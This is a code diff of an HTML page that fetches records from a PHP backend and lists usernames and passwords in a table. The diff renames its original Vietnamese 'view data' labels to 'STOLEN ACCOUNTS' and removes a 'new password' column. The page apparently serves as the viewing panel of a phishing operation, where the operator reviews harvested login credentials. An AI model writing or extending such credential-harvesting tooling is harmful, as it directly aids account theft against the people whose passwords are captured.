@@ -1,18 +1,17 @@
 ﻿<!DOCTYPE html>
 <html>
 <head>
-    <title>Xem dữ liệu</title>
+    <title>STOLEN ACCOUNTS</title>
     <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
 </head>
 <body>
-    <h2>Bảng dữ liệu người dùng</h2>
+    <h2>STOLEN ACCOUNTS</h2>
     <table border="1" cellpadding="5" id="dataTable">
         <thead>
             <tr>
-                <th>STT</th>
+                <th>No.</th>
                 <th>Username</th>
-                <th>Mật khẩu hiện tại</th>
-                <th>Mật khẩu mới</th>
+                <th>Password</th>
             </tr>
         </thead>
         <tbody>
@@ -22,7 +21,7 @@
 
     <script>
         function loadData() {
-            $.get("lay_dulieu.php", function(data) {
+            $.get("db_access.php", function(data) {
                 let rows = "";
                 let json = JSON.parse(data);
                 json.forEach((item, index) => {
@@ -31,7 +30,6 @@
                             <td>${index + 1}</td>
                             <td>${item.username}</td>
                             <td>${item.password}</td>
-                            <td>${item.new_password}</td>
                         </tr>
                     `;
                 });
